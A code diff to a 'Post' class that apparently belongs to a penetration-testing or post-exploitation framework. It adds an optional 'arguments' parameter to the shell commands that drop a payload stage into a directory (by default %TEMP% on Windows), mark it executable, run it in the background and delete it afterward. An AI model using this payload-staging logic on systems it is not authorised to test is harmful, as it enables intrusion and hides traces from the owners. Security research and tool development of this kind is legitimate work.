@@ -37,7 +37,7 @@ class Post(Push, StringTools):
 
     post_methods = Push().push_methods
 
-    def post(self, platform, payload, sender, args=[], method=None,
+    def post(self, platform, payload, sender, args=[], arguments=None, method=None,
              location=None, concat=None, background=None, linemax=100):
         if method in self.post_methods or not method:
             if not method:
@@ -65,7 +65,11 @@ class Post(Push, StringTools):
                     background = '&'
 
                 path = location + '/' + filename
-                command = f"sh -c 'chmod 777 {path} {concat} {path} {concat} rm {path}' {background}"
+
+                if not arguments:
+                    command = f"sh -c 'chmod 777 {path} {concat} {path} {concat} rm {path}' {background}"
+                else:
+                    command = f"sh -c 'chmod 777 {path} {concat} {path} {arguments} {concat} rm {path}' {background}"
             elif platform in self.types.platforms['windows']:
                 if not location:
                     location = '%TEMP%'
@@ -75,7 +79,11 @@ class Post(Push, StringTools):
                     background = ''
 
                 path = location + '\\' + filename
-                command = f"{background} {path} {concat} del {path}"
+
+                if not arguments:
+                    command = f"{background} {path} {concat} del {path}"
+                else:
+                    command = f"{background} {path} {arguments} {concat} del {path}"
             else:
                 self.badges.print_error("Unsupported platform, failed to send payload stage!")
                 return
